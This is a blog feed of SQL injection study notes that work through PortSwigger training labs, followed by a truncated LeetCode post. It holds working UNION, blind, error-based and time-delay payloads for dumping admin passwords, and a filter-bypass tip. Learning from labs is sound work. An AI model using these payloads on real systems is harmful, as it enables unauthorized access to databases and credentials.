username=&#39;administrator&#39;)=&#39;a</code></p><p>这部分较为简单的方法就是使用intruder写payload进行自动攻击。</p><p>Password:<code>l0libd4yt463lcxyow0c</code></p><p>可以明显感觉到从这一题开始不像开始那么简单了，工作量变得很大，所以我们应该更加注重工具的使用。</p><h4 id="2）通过触发SQL错误引入条件响应"><a href="#2）通过触发SQL错误引入条件响应" class="headerlink" title="2）通过触发SQL错误引入条件响应"></a>2）通过触发SQL错误引入条件响应</h4><p>当网站不会在数据库返回为空时显示不同的响应时，上面的注入就不能成功了。在这种情形下，通常可能的方式是通过引发SQL错误导致网页显示不同的响应。下面是两个cookie请求：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">xyz<span class="hljs-string">&#x27; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#x27;</span>a<span class="hljs-string">&#x27; END)=&#x27;</span>a<br>xyz<span class="hljs-string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#x27;</span>a<span class="hljs-string">&#x27; END)=&#x27;</span>a<br></code></pre></td></tr></table></figure><p>这些输入使用了关键字CASE根据不同的条件返回不同的表达式，第一个输入会返回<code>&#39;a&#39;</code>而第二个输入会返回<code>1/0</code>并造成devide-by-zero错误。此错误可能会造成页面的些许区别，如果有区别，我们就可以使用此区别来获取一些信息，如admin的密码：若密码第一位大于m则正常输出，若小于m则报错。</p><p><code>xyz&#39; AND (SELECT CASE WHEN (Username = &#39;Administrator&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;m&#39;) THEN 1/0 ELSE &#39;a&#39; END FROM Users)=&#39;a</code></p><blockquote><p> <a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">Lab: Blind SQL injection with conditional errors</a></p></blockquote><p>尝试用前两个请求作为输入，都会显示Internal Sever Error，原因可能是数据库种类的问题。提示说是Oracle数据库，所以应该使用Oracle对应的格式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (YOUR<span class="hljs-operator">-</span><span class="hljs-keyword">CONDITION</span><span class="hljs-operator">-</span>HERE) <span class="hljs-keyword">THEN</span> to_char(<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">END</span> <span class="hljs-keyword">FROM</span> dual <br></code></pre></td></tr></table></figure><p>这一次的payload就不再显示错误了，通过此输入判断密码长度为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; AND (SELECT CASE WHEN(username=&#x27;</span>administrator<span class="hljs-string">&#x27; AND LENGTH(password)&gt;0) THEN to_char(1/0) ELSE &#x27;</span>a<span class="hljs-string">&#x27; END FROM dual)=&#x27;</span>a<br></code></pre></td></tr></table></figure><h4 id="3-通过触发时延-Time-delays-进行盲注"><a href="#3-通过触发时延-Time-delays-进行盲注" class="headerlink" title="3) 通过触发时延(Time delays)进行盲注"></a>3) 通过触发时延(Time delays)进行盲注</h4><p>如果应用会捕捉并处理数据库错误，上面的方法就不再适用。在这种情形下，由于SQL请求通常是同步运行的，延迟处理SQL请求意味着HTTP应答的延迟。所以，就可以通过HTTP相应的时延判断SQL运行的时延。触发时延的方法根据数据库种类的不同而不同，SQL Server中可以用以下代码触发：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">10</span><span class="hljs-string">&#x27;-- --不会触发</span><br><span class="hljs-string">&#x27;</span>; IF (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>) WAITFOR DELAY <span class="hljs-string">&#x27;0:0:10&#x27;</span><span class="hljs-comment">----会触发</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">其他数据库：</span><br><span class="hljs-comment">Oracle dbms_pipe.receive_message((&#x27;a&#x27;),10)</span><br><span class="hljs-comment">Microsoft WAITFOR DELAY &#x27;0:0:10&#x27;</span><br><span class="hljs-comment">PostgreSQL SELECT pg_sleep(10)</span><br><span class="hljs-comment">MySQL SELECT sleep(10) </span><br><span class="hljs-comment">*/</span><br># 然后就可以用此方法获得信息。<br><span class="hljs-string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrator<span class="hljs-string">&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="hljs-string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:&#123;delay&#125;<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">Lab: Blind SQL injection with time delays</a></p></blockquote><p>#Todo</p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">Lab: Blind SQL injection with time delays and information retrieval</a></p></blockquote><p>#Todo</p><h4 id="4-使用带外技术（out-of-band-OAST-进行盲注"><a href="#4-使用带外技术（out-of-band-OAST-进行盲注" class="headerlink" title="4)使用带外技术（out-of-band, OAST)进行盲注"></a>4)使用带外技术（out-of-band, OAST)进行盲注</h4><p>#inprogress<br>需要 Burp professional 用 kali 时解决。</p><h4 id="5）如何防范盲注？"><a href="#5）如何防范盲注？" class="headerlink" title="5）如何防范盲注？"></a>5）如何防范盲注？</h4><p>虽然寻找和利用盲注 SQL 漏洞相比普通的 SQL 漏洞来说更为复杂，但防止注入的方法都是相同的，例如谨慎使用参数化查询、使用安全的 API 等。</p><h1 id="3-如何检测-SQL-注入漏洞"><a href="#3-如何检测-SQL-注入漏洞" class="headerlink" title="3. 如何检测 SQL 注入漏洞"></a>3. 如何检测 SQL 注入漏洞</h1><p>手动检测，可以对每个入口点按照上面的利用方式进行检测，并寻找程序显示或响应时间的差异。</p><ul><li>提交 <code>&#39;</code></li><li>提交布尔条件。</li><li>提交在 SQL 查询中触发时间延迟的有效负载。</li><li>提交在 SQL 查询中触发带外网络交互的 OAST 有效负载，并对交互进行监控。</li></ul><h1 id="4-如何绕过检测"><a href="#4-如何绕过检测" class="headerlink" title="4. 如何绕过检测"></a>4. 如何绕过检测</h1><h2 id="4-1-编码绕过"><a href="#4-1-编码绕过" class="headerlink" title="4.1 编码绕过"></a>4.1 编码绕过</h2><p>有的应用可以接受 JSON 或 XML 各式的数据作为输入来进行 SQL 查询。这样的混淆技术可能可以成功绕过 WAF 等防御措施（关键字过滤等）。例如，字符 S 可以写成 XML 形式的 <code>&amp;#x53;</code>。</p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding">Lab: SQL injection with filter bypass via XML encoding</a></p></blockquote><p>Solution:<br><strong>定位</strong><br>这个 Lab 点开以后很快可以发现有检查库存的功能。使用 Burp 抓包可以看到查询的语句用的是 XML。<img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8ojoaa44zj30f006ymxm.jpg"><br>首先看一下注入点，加了一个 <code>&#39;OR 1=1 -- </code> 后显示了”Attack detected”，也就是说针对常见的注入关键字有检测。</p><h1 id="5-二次注入"><a href="#5-二次注入" class="headerlink" title="5. 二次注入"></a>5. 二次注入</h1><div class="note note-info">            <p>文字 或者 <code>markdown</code> 均可</p>          </div><p class="note note-primary">标签</p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL Burp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL Injection Attacks</title>
    <link href="/2022/02/07/2022-02-01-SQL-Injetction/"/>
    <url>/2022/02/07/2022-02-01-SQL-Injetction/</url>
    
    <content type="html"><![CDATA[<blockquote><p>Source: <a href="https://portswigger.net/web-security/sql-injection">https://portswigger.net/web-security/sql-injection</a></p><p>Cheatsheet: <a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p></blockquote><h2 id="What-is-SQL-Injection"><a href="#What-is-SQL-Injection" class="headerlink" title="What is SQL Injection?"></a>What is SQL Injection?</h2><p>A <strong>web vulnerability</strong> that allows an attaker to interfere with the queries that an application makes to its database. Allow attakers to view data that they are not normally able to see. In some cases, SQL injection can be escalated to compromise underlying server or DoS attack.</p><h4 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h4><ul><li>Leakage of unauthorised data.</li><li>Persistant backdoor.</li></ul><h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><h3 id="1-Retrieving-hidden-data"><a href="#1-Retrieving-hidden-data" class="headerlink" title="1. Retrieving hidden data"></a>1. Retrieving hidden data</h3><ul><li>– is a comment indicator in SQL, anything after will be interpreted as comment.</li><li>Use <code>&#39;</code> to break the SQL command and add the injection.</li><li>Types of injections:<ul><li>OR 1&#x3D;1: return all data.</li></ul></li></ul><h3 id="2-Subverting-application-logic"><a href="#2-Subverting-application-logic" class="headerlink" title="2. Subverting application logic"></a>2. Subverting application logic</h3><p>Scenario: user login with username and password. </p><p><code>SELECT * FROM users WHERE username = &#39;wiener&#39; AND password = &#39;bluecheese&#39;</code></p><p>The goal is to hack in without knowing password, the method is to use the comment indicator to remove the password check, for example by entering username as <code>admin&#39;--</code>. The logic will be subverted by remove the <code>WHERE</code> clause. </p><h3 id="3-Retrieving-data-from-another-database"><a href="#3-Retrieving-data-from-another-database" class="headerlink" title="3. Retrieving data from another database"></a>3. Retrieving data from another database</h3><p>Use <code>UNION</code> key word to make additional queries that are appended on the original query. For example:</p><p><code>SELECT a, b FROM table1 UNION SELECT c, d FROM table2</code></p><p>Key requirements:</p><ol><li>Each query must return the same number of columns.</li><li>The data types in each column must be compatible. (Same type for each column)</li></ol><p>So that in order to carry out a UNION attack, I need to figure out: </p><h4 id="How-many-columns-are-required-in-the-attack"><a href="#How-many-columns-are-required-in-the-attack" class="headerlink" title="How many columns are required in the attack"></a>How many columns are required in the attack</h4><ol><li>Injecting a series of <code>&#39;ORDER BY num--</code>clauses until an error occurs.  This means to order the results by different columns, if the number exceeds the column number, there might be error messages or detectable difference.</li><li>Submitting a series of <code>UNION SELECT NULL, NULL ...--</code>clauses. When matches, there will be an additional roll containing null values in each column. The reason using null is for compatibility. <ol><li>For Oracle database, there is a built-in table called <code>dual</code> which can be used in this attack: <code> UNION SELECT NULL FROM DUAL--</code></li><li>In MySQL, <code>--</code>must be followed by a space or simply use <code>#</code> as comment.</li></ol></li></ol><h4 id="Finding-columns-with-useful-data-type"><a href="#Finding-columns-with-useful-data-type" class="headerlink" title="Finding columns with useful data type"></a>Finding columns with useful data type</h4><p>To find which column has the desired data type, assume that there are 4 columns, you can submit:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UNION SELECT &#x27;</span>a<span class="hljs-string">&#x27;,NULL,NULL,NULL--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; UNION SELECT NULL,NULL,&#x27;</span>a<span class="hljs-string">&#x27;,NULL--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p>And you can judge the data type from the error message.</p><p>Now you know the number of columns and found which column has a string data, the next step is to get data you are interested in by <code>UNION</code> attack.</p><h3 id="4-Examining-the-database"><a href="#4-Examining-the-database" class="headerlink" title="4. Examining the database"></a>4. Examining the database</h3><p>It is generally useful to get more information from the database for further exploitation. Including version details, contents of the database.</p><h4 id="Get-database-type-and-version"><a href="#Get-database-type-and-version" class="headerlink" title="Get database type and version"></a>Get database type and version</h4><p>Because that different databases have different ways of querying version, you usually need to try all the possible ways to determine which one it is. (Use <code>&#39; UNION</code>)</p><table><thead><tr><th><strong>Database type</strong></th><th><strong>Query</strong></th></tr></thead><tbody><tr><td>Microsoft, MySQl</td><td><code>SELECT @@version</code></td></tr><tr><td>Oracle</td><td><code>Select banner FROM v$version</code></td></tr><tr><td>PostgreSQL</td><td><code>SELECT version()</code></td></tr></tbody></table><hr><p><strong><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle">Lab SQL injection, query the database type and version (Oracle)</a></strong></p><ol><li>Find how many columns are there in the table. Add <code>&#39;ORDER BY num&#39;</code> to the end of the url and find that there are two columns.</li><li>Find that the second column has the datatype sting.</li><li>Add the following query to return the banner of the database.</li></ol><p><code>&#39;UNION SELECT NULL, banner FROM v$version--</code></p><p>Result:</p> <img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyztugzf0pj30vg09cdgw.jpg" alt="image-20220202203119278" style="zoom:50%;" /><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft">Lab Query the database and version (MySQL and Microsoft)</a></p><ol><li>First, determine the number of columns of the returned table using <code>&#39;UNION SELECT NULL, NULL#</code>. Then we know that there are two columns.</li><li>Second, find the data type of these columns to see if they are string. By setting each <code>NULL</code> to <code>&#39;a&#39;</code>, two columns have the same data type of string, so we can use either to perform the SQL injection</li><li>Get the database version by the following query:<code>&#39;UNION SELECT @@version, NULL#</code></li></ol><p>Result: </p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gyzvkzwpt7j305003a3ya.jpg" alt="image-20220202213128309" style="zoom:50%;" /><h4 id="Listing-the-content-of-the-database"><a href="#Listing-the-content-of-the-database" class="headerlink" title="Listing the content of the database"></a>Listing the content of the database</h4><p>Most databases (except for Oracle) have views that provide information about the database. For example <code>information_schema</code> that contains the table names and column names for each table.</p><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle">Lab SQL injection, listing the databases on non-Oracle databases</a></p><ol><li><p>首先还是通过NULL来决定表的每一列的数据类型。<code>&#39;UNION SELECT NULL, NULL--</code></p></li><li><p>然后查看<code>information_schema</code>中的表名都是什么。<code>&#39;+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code></p></li><li><p>找到一个user开头的表名，应该就是存放用户信息的，进一步看这个表中有哪些列。<code>&#39;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=&#39;users_tsxwcv&#39;--</code></p><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i4f319oj30by02kwec.jpg" alt="image-20220208150439802"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i4pgcnqj30as03yt8m.jpg" alt="image-20220208150459170"></p></li><li><p>这样就找到了存放用户名和密码的列。再次请求得到admin的密码即可。<code>&#39;+UNION+SELECT+username_qvqafc,+password_zecjow+FROM+users_tsxwcv--</code></p></li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6i81e4t6j30fs04o3yi.jpg" alt="image-20220208150811298"></p><h4 id="在Oracle中的类似操作"><a href="#在Oracle中的类似操作" class="headerlink" title="在Oracle中的类似操作"></a>在Oracle中的类似操作</h4><p>在oracle中，只需要进行一些修改即可得到相同的数据。所有表的信息可以从<code>all_tables</code>获得，具体列名可以通过以下命令获得：</p><p><code>SELECT * FROM all_tab_columns WHERE table_name = &#39;USERS&#39;</code></p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle">Lab SQL injection attack, listing the database contents on Oracle</a></p></blockquote><p>由于Oracle数据库中的<code>SELECT</code>必须要和<code>FROM</code>配合出现，所以可以用<code>dual</code>表来进行占位。</p><ol><li>通过尝试，<code>&#39;UNION+SELECT+&#39;abc&#39;,+&#39;abc&#39;+FROM+dual--</code>成功，说明有当前表有两列且都是字符串类型。</li><li>查看有哪些表：<code>&#39;UNION+SELECT+table_name,+NULL+FROM+all_tables--</code>，找到了<strong>USERS_AHJNLZ</strong>这张表。</li><li>查看这张表中有哪些列：<code>&#39;UNION+SELECT+column_name,+NULL+FROM+all_tab_columns+WHERE+table_name=&#39;USERS_AHJNLZ&#39;--</code>最终找到存放用户名和密码的列名为：PASSWORD_QAGOVT和USERNAME_WGWVWL</li><li>最后就可以找到admin的密码：<code>&#39;UNION SELECT USERNAME_WGWVWL, PASSWORD_QAGOVT FROM USERS_AHJNLZ--</code></li></ol><p><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gz6j89ft6oj30j20b0dg9.jpg" alt="image-20220208154259474"></p><h3 id="4-盲注（Blind-SQL-Injection"><a href="#4-盲注（Blind-SQL-Injection" class="headerlink" title="4. 盲注（Blind SQL Injection)"></a>4. 盲注（Blind SQL Injection)</h3><p>在很多情形下，SQL注入后不会显示错误信息甚至不会返回任何信息，例如应用有SQL漏洞，但是其HTTP回应不含相应注入的返回信息和数据库错误信息。常用的如UNION注入就不再适用了。这种blind漏洞仍然是可利用的，只不过更加复杂。常用的盲注方法有：</p><h4 id="1）触发条件应答盲注"><a href="#1）触发条件应答盲注" class="headerlink" title="1）触发条件应答盲注"></a>1）触发条件应答盲注</h4><p>例如在使用cookie登录时，服务器可能使用以下语句验证cookie：</p><p><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = &#39;cookie&#39;</code></p><p>不同于之前的注入，不正确的cookie不会返回任何信息，但是正确的cookie会重定位到一个例如Welcome Back的页面，这样的行为就是一种条件应答，并且可以作为一个注入点。这样的注入如何进行呢？考虑下面两种cookie后的输入</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">…xyz&#x27; AND &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">1</span><br>…xyz&#x27; AND &#x27;<span class="hljs-number">1</span>&#x27;=&#x27;<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>第一个请求会显示welcome back，而第二个请求因为条件恒为false会导致没有返回，也就不会显示welcome back，这样的差别就让我们可以判断请求的对错从而获取数据库内的相关信息。例如，假设数据库中有一个User表，其中有Username和Password列，其中存放着用户Administrator的信息，我们可以通过每次确定一个字符的方式获取其登录密码，如下所示：</p><p><code>xyz&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;Administrator&#39;), 1, 1) &gt; &#39;m</code></p><p>如果返回welcome页面，则可以确定其密码的第一个字符大于m。重复此步骤直到获得完整密码。</p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses">Lab: Blind SQL injection with conditional responses</a></p></blockquote><p>此lab的任务就是找到admin的密码，使用Burp查看一下页面请求发现了cookie：</p><p><code>Cookie: TrackingId=xrZbR12nPsEWP8FJ; session=BBFx677kQDfMJXYbCXWJFahUhthnZdK3</code></p><p>尝试再其后添加<code>AND &#39;1&#39;=&#39;1</code>，结果可以正常显示Welcome back，添加<code>AND &#39;1&#39;=&#39;2</code>后则不能正常显示，说明可以进行盲注。第二步就是逐步获得admin的密码。首先确定存在数据库，确定列名和admin的存在性。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users LIMIT 1)=&#39;a</code></p><p>结果表明存在users表。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39;)=&#39;a</code></p><p>结果表明存在username这一列，并且存在用户administrator。接下来，最好确定一下密码的长度。</p><p><code>&#39; AND (SELECT &#39;a&#39; FROM users WHERE username=&#39;administrator&#39; AND LENGTH(password)&gt;2)=&#39;a</code></p><p>在repeater中不断修改长度，最终得到密码有20位，还是挺复杂的。接下来就可以尝试获取密码的具体值了。</p><p><code>&#39; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#39;administrator&#39;)=&#39;a</code></p><p>这部分较为简单的方法就是使用intruder写payload进行自动攻击。</p><p>Password:<code>l0libd4yt463lcxyow0c</code></p><p>可以明显感觉到从这一题开始不像开始那么简单了，工作量变得很大，所以我们应该更加注重工具的使用。</p><h4 id="2）通过触发SQL错误引入条件响应"><a href="#2）通过触发SQL错误引入条件响应" class="headerlink" title="2）通过触发SQL错误引入条件响应"></a>2）通过触发SQL错误引入条件响应</h4><p>当网站不会在数据库返回为空时显示不同的响应时，上面的注入就不能成功了。在这种情形下，通常可能的方式是通过引发SQL错误导致网页显示不同的响应。下面是两个cookie请求：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">xyz<span class="hljs-string">&#x27; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#x27;</span>a<span class="hljs-string">&#x27; END)=&#x27;</span>a<br>xyz<span class="hljs-string">&#x27; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#x27;</span>a<span class="hljs-string">&#x27; END)=&#x27;</span>a<br></code></pre></td></tr></table></figure><p>这些输入使用了关键字CASE根据不同的条件返回不同的表达式，第一个输入会返回<code>&#39;a&#39;</code>而第二个输入会返回<code>1/0</code>并造成devide-by-zero错误。此错误可能会造成页面的些许区别，如果有区别，我们就可以使用此区别来获取一些信息，如admin的密码：若密码第一位大于m则正常输出，若小于m则报错。</p><p><code>xyz&#39; AND (SELECT CASE WHEN (Username = &#39;Administrator&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;m&#39;) THEN 1/0 ELSE &#39;a&#39; END FROM Users)=&#39;a</code></p><blockquote><h6 id="Lab-Blind-SQL-injection-with-conditional-errors"><a href="#Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab: Blind SQL injection with conditional errors"></a><a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors">Lab: Blind SQL injection with conditional errors</a></h6></blockquote><p>尝试用前两个请求作为输入，都会显示Internal Sever Error，原因可能是数据库种类的问题。提示说是Oracle数据库，所以应该使用Oracle对应的格式。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (YOUR<span class="hljs-operator">-</span><span class="hljs-keyword">CONDITION</span><span class="hljs-operator">-</span>HERE) <span class="hljs-keyword">THEN</span> to_char(<span class="hljs-number">1</span><span class="hljs-operator">/</span><span class="hljs-number">0</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">END</span> <span class="hljs-keyword">FROM</span> dual <br></code></pre></td></tr></table></figure><p>这一次的payload就不再显示错误了，通过此输入判断密码长度为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; AND (SELECT CASE WHEN(username=&#x27;</span>administrator<span class="hljs-string">&#x27; AND LENGTH(password)&gt;0) THEN to_char(1/0) ELSE &#x27;</span>a<span class="hljs-string">&#x27; END FROM dual)=&#x27;</span>a<br></code></pre></td></tr></table></figure><h4 id="3-通过触发时延-Time-delays-进行盲注"><a href="#3-通过触发时延-Time-delays-进行盲注" class="headerlink" title="3) 通过触发时延(Time delays)进行盲注"></a>3) 通过触发时延(Time delays)进行盲注</h4><p>如果应用会捕捉并处理数据库错误，上面的方法就不再适用。在这种情形下，由于SQL请求通常是同步运行的，延迟处理SQL请求意味着HTTP应答的延迟。所以，就可以通过HTTP相应的时延判断SQL运行的时延。触发时延的方法根据数据库种类的不同而不同，SQL Server中可以用以下代码触发：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-number">10</span><span class="hljs-string">&#x27;-- --不会触发</span><br><span class="hljs-string">&#x27;</span>; IF (<span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>) WAITFOR DELAY <span class="hljs-string">&#x27;0:0:10&#x27;</span><span class="hljs-comment">----会触发</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">其他数据库：</span><br><span class="hljs-comment">Oracle dbms_pipe.receive_message((&#x27;a&#x27;),10)</span><br><span class="hljs-comment">Microsoft WAITFOR DELAY &#x27;0:0:10&#x27;</span><br><span class="hljs-comment">PostgreSQL SELECT pg_sleep(10)</span><br><span class="hljs-comment">MySQL SELECT sleep(10) </span><br><span class="hljs-comment">*/</span><br># 然后就可以用此方法获得信息。<br><span class="hljs-string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrator<span class="hljs-string">&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="hljs-string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:&#123;delay&#125;<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays">Lab: Blind SQL injection with time delays</a></p></blockquote><p>Todo</p><blockquote><p><a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval">Lab: Blind SQL injection with time delays and information retrieval</a></p></blockquote><p>Todo</p><h4 id="4-使用带外技术（out-of-band-进行盲注"><a href="#4-使用带外技术（out-of-band-进行盲注" class="headerlink" title="4)使用带外技术（out-of-band)进行盲注"></a>4)使用带外技术（out-of-band)进行盲注</h4><p>Todo</p><h4 id="5）如何防范盲注？"><a href="#5）如何防范盲注？" class="headerlink" title="5）如何防范盲注？"></a>5）如何防范盲注？</h4>]]></content>
    
    
    
    <tags>
      
      <tag>Security learning</tag>
      
      <tag>SQL</tag>
      
      <tag>Server security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Leetcode数组专题</title>
    <link href="/2022/02/07/2021-2-7-Leetcode-%E6%95%B0%E7%BB%84%E4%B8%93%E9%A2%98/"/>
    <url>/2022/02/07/2021-2-7-Leetcode-%E6%95%B0%E7%BB%84%E4%B8%93%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h3 id="1-二分查找"><a href="#1-二分查找" class="headerlink" title="1. 二分查找"></a>1. 二分查找</h3><h4 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title="704.二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search/">704.二分查找</a></h4><p>给定一个 n 个元素有序的（升序）整型数组 nums 和一个目标值 target  ，写一个函数搜索 nums 中的 target，如果目标值存在返回下标，否则返回 -1。提示：必须以<code>log(n)</code>时间复杂度完成。</p><p>条件：</p><ul><li>所有num都是唯一的。</li><li>Nums 升序排列</li></ul><p>思路：先考虑边界，如果第一个元素比target大，或最后一个元素比target小，直接返回-1。使用二分法，先初始化le ft和right为列表左右边界，找到中间值mid与target比大小，如果mid&gt;target则说明target在左区间，right更新为mid左边第一个。如果mid&lt;target说明其在右区间，left更新为mid右边第一个。循环条件为left小于等于right，等于时left，right，mid都是最终结果，代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">search</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">int</span> right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> mid = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(target&gt;nums[right] || target &lt; nums[<span class="hljs-number">0</span>]) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        <span class="hljs-keyword">while</span> (left&lt;=right)<br>        &#123;<br>            mid = left + (right - left) / <span class="hljs-number">2</span>; <span class="hljs-comment">//或 &gt;&gt; 1循环右移</span><br>            <span class="hljs-keyword">if</span>(nums[mid]&gt;target) &#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span 